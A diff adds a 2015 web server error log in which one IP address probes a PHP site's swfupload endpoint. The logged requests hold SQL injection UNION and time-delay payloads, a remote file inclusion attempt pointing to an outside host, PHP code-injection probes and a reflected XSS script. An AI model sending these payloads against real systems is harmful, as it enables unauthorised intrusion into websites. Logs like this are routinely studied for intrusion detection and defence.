@@ -1,0 +1,81 @@
+[ 2015-07-06T20:26:56+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%29%29%2C%2C%2C%28%29%22.%27&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset)),,,()".'
+
+[ 2015-07-06T20:27:07+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-07-06T20:27:07+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-07-06T20:27:07+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-07-06T20:27:08+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-07-06T20:27:08+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-07-06T20:27:09+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-07-06T20:27:09+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
+
+[ 2015-07-06T20:27:09+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-07-06T20:27:10+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-07-06T20:27:10+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-07-06T20:27:11+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
+
+[ 2015-07-06T20:27:11+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
+
+[ 2015-07-06T20:27:12+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-07-06T20:27:12+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-07-06T20:27:12+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-07-06T20:27:13+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%20AND%20SLEEP%285%29&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset AND SLEEP(5)
+
+[ 2015-07-06T20:27:13+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%3B%20SELECT%20PG_SLEEP%285%29--&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset; SELECT PG_SLEEP(5)--
+
+[ 2015-07-06T20:27:14+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%3B%20SELECT%20SLEEP%285%29--%20&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset; SELECT SLEEP(5)-- 
+
+[ 2015-07-06T20:27:14+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset'%3B%20SELECT%20SLEEP%285%29--%20&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset'; SELECT SLEEP(5)-- 
+
+[ 2015-07-06T20:27:14+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=asset%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&g=asset&args=10,gif|jpg|jpeg|png|bmp,0&module=&catid=
+ERR: 无法加载控制器:Asset WAITFOR DELAY '0:0:5'--
+
+[ 2015-07-06T20:28:13+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=http%3A%2F%2F120.26.55.211%2Fs.txt&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:Http://120.26.55.211/s.txt
+
+[ 2015-07-06T20:29:50+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=a_long_name_file_not_exist&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:A_long_name_file_not_exist
+
+[ 2015-07-06T20:30:11+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}
+
+[ 2015-07-06T20:30:24+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-07-06T20:32:51+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:Print(md5(this_is_a_test_string));die();/*
+
+[ 2015-07-06T20:33:05+08:00 ] 121.42.0.16 /index.php?a=swfupload&m=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&g=asset&args=10%2Cgif%7Cjpg%7Cjpeg%7Cpng%7Cbmp%2C0&module=&catid=
+ERR: 无法加载控制器:'">alert(98733)
+
